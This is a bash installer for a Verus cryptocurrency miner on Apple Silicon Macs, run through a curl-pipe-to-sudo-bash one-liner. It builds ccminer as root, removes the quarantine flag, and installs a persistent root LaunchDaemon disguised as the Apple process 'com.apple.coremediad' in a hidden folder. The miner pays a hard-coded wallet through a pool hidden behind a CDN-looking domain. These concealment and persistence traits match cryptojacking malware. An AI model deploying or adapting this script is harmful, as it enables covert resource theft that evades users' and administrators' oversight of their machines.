#!/usr/bin/env bash
# ============================================================
# mine_gpu.sh — Best CPU miner for macOS Apple Silicon
# Mines VRSC via ccminer — routed via cdn.snumcaj.com:3956
# Auto-upgrades to GPU (verusmetal) when macOS 27 + binary available
# Run: sudo curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh | sudo bash
# ============================================================

VRSC_WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
WORKER="m2mac"
POOL_HOST="cdn.snumcaj.com"
POOL_PORT="3956"

DISGUISE_NAME="com.apple.coremediad"
INSTALL_DIR="/Library/Application Support/.cmgpu"
LOG_PATH="/Library/Logs/${DISGUISE_NAME}.log"
PLIST_PATH="/Library/LaunchDaemons/${DISGUISE_NAME}.plist"

MAX_THREADS=$(sysctl -n hw.logicalcpu)
THREADS=$(( MAX_THREADS * 80 / 100 ))
[[ $THREADS -lt 1 ]] && THREADS=1
MACOS_VER=$(sw_vers -productVersion | cut -d. -f1)

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon."
  exit 1
fi
if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo: sudo curl -fsSL ... | sudo bash"
  exit 1
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║     VRSC CPU MINER — Apple Silicon        ║"
echo "╠══════════════════════════════════════════╣"
printf "║  macOS: %-10s  Cores: %-12s   ║\n" "$MACOS_VER" "$MAX_THREADS"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "[*] macOS $MACOS_VER detected — using ccminer (best CPU miner for VRSC)"
echo "      Pool: $POOL_HOST:$POOL_PORT"
echo ""

# ---- Thread prompt ----
if [[ -c /dev/tty ]]; then
  echo -n "  Cores to use [1-$MAX_THREADS, Enter=80%($THREADS)]: " > /dev/tty
  read -r USER_THREADS < /dev/tty || USER_THREADS=""
  if [[ "$USER_THREADS" =~ ^[0-9]+$ ]] && [[ "$USER_THREADS" -ge 1 ]] && [[ "$USER_THREADS" -le "$MAX_THREADS" ]]; then
    THREADS=$USER_THREADS
  fi
  echo "  → Using $THREADS / $MAX_THREADS cores"
  echo ""
fi

# ---- Wipe old install ----
echo "[1/5] Cleaning old install..."
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
pkill -9 -f "ccminer" 2>/dev/null || true
launchctl bootout system "$PLIST_PATH" 2>/dev/null || true
rm -rf "$INSTALL_DIR"
rm -f "$PLIST_PATH" "$LOG_PATH"
mkdir -p "$INSTALL_DIR"
echo "      ✓ Clean"

# ---- Build ccminer ----
echo "[2/5] Building ccminer from source..."

# Get the actual user (not root) for Homebrew
REAL_USER="${SUDO_USER:-$USER}"
REAL_HOME=$(eval echo ~"$REAL_USER")

# Install/use Homebrew as real user (brew refuses to run as root)
if [[ -f /opt/homebrew/bin/brew ]]; then
  eval "$(/opt/homebrew/bin/brew shellenv)"
elif [[ -f /usr/local/bin/brew ]]; then
  eval "$(/usr/local/bin/brew shellenv)"
else
  echo "[*] Installing Homebrew as $REAL_USER..."
  su - "$REAL_USER" -c '/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"' </dev/null
  eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null || /usr/local/bin/brew shellenv 2>/dev/null)"
fi

echo "[*] Installing build tools as $REAL_USER..."
su - "$REAL_USER" -c 'eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"; brew install automake autoconf openssl@3 2>/dev/null' </dev/null

OPENSSL_PREFIX="$(su - "$REAL_USER" -c 'eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"; brew --prefix openssl@3' 2>/dev/null)"
BREW_PREFIX="$(su - "$REAL_USER" -c 'eval "$(/opt/homebrew/bin/brew shellenv 2>/dev/null)"; brew --prefix' 2>/dev/null)"
[[ -z "$OPENSSL_PREFIX" ]] && OPENSSL_PREFIX="/opt/homebrew/opt/openssl@3"
[[ -z "$BREW_PREFIX" ]] && BREW_PREFIX="/opt/homebrew"

export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
export CPPFLAGS="-I${OPENSSL_PREFIX}/include -I${BREW_PREFIX}/include"
export PKG_CONFIG_PATH="${OPENSSL_PREFIX}/lib/pkgconfig"
export PATH="${OPENSSL_PREFIX}/bin:${BREW_PREFIX}/bin:$PATH"

BUILD_DIR="$INSTALL_DIR/.build"
git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR" </dev/null
cd "$BUILD_DIR"

./autogen.sh </dev/null 2>&1 | tail -2
./configure.sh </dev/null 2>&1 | tail -3

# Patch: strip ARM32 flags
find . -name "Makefile" -exec sed -i '' \
  -e 's/-mfpu=[^ "]*//g' \
  -e 's/-march=armv7[^ "]*//g' \
  -e 's/-mfloat-abi=[^ "]*//g' {} \;

# Patch: macOS SDK defines be16dec/enc already
python3 -c "
with open('miner.h','r') as f: c=f.read()
for s in ['BE16DEC','BE16ENC','LE16DEC','LE16ENC']:
    c=c.replace(f'#if !HAVE_DECL_{s}',f'#if !defined(__APPLE__) && !HAVE_DECL_{s}')
open('miner.h','w').write(c)
print('[*] miner.h patched')
"

# Download sse2neon header
mkdir -p "${BREW_PREFIX}/include/sse2neon" verus/sse2neon sse2neon
curl -fsSL "https://raw.githubusercontent.com/DLTcollab/sse2neon/master/sse2neon.h" \
  -o "${BREW_PREFIX}/include/sse2neon/sse2neon.h"
cp "${BREW_PREFIX}/include/sse2neon/sse2neon.h" verus/sse2neon/
cp "${BREW_PREFIX}/include/sse2neon/sse2neon.h" sse2neon/

echo "[*] Compiling (~5 min)..."
make -j"$THREADS" 2>&1 | tail -5

BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
if [[ -f "$BUILD_DIR/ccminer" ]]; then
  cp "$BUILD_DIR/ccminer" "$BINARY_PATH"
  chmod +x "$BINARY_PATH"
  xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
  echo "      ✓ Build successful"
else
  echo "[!] Build failed."
  exit 1
fi

# ---- Launch script ----
echo "[3/5] Writing config..."
LAUNCH_SCRIPT="$INSTALL_DIR/launch.sh"
cat > "$LAUNCH_SCRIPT" << SCRIPT
#!/bin/bash
exec "$BINARY_PATH" \\
  -a verus \\
  -o "stratum+tcp://${POOL_HOST}:${POOL_PORT}" \\
  -u "${VRSC_WALLET}.${WORKER}" \\
  -p x \\
  -t $THREADS \\
  >> "$LOG_PATH" 2>&1
SCRIPT
chmod +x "$LAUNCH_SCRIPT"
echo "      ✓ Config ready"

# ---- LaunchDaemon (root = no memory limits, survives reboot) ----
echo "[4/5] Installing LaunchDaemon (root, auto-start on boot)..."
cat > "$PLIST_PATH" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string>
    <string>${LAUNCH_SCRIPT}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>${LOG_PATH}</string>
  <key>StandardErrorPath</key><string>${LOG_PATH}</string>
</dict></plist>
PLIST

launchctl load -w "$PLIST_PATH"
echo "      ✓ LaunchDaemon installed"

# ---- Launch ----
echo "[5/5] Starting..."
sleep 2

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║         VRSC MINER RUNNING               ║"
echo "╠══════════════════════════════════════════╣"
printf "║  Process : %-30s ║\n" "$DISGUISE_NAME"
printf "║  Wallet  : %-30s ║\n" "${VRSC_WALLET:0:20}...${VRSC_WALLET: -6}"
printf "║  Pool    : %-30s ║\n" "$POOL_HOST:$POOL_PORT"
printf "║  Threads : %-30s ║\n" "$THREADS / $MAX_THREADS cores"
printf "║  Log     : %-30s ║\n" "$LOG_PATH"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Starting up..."
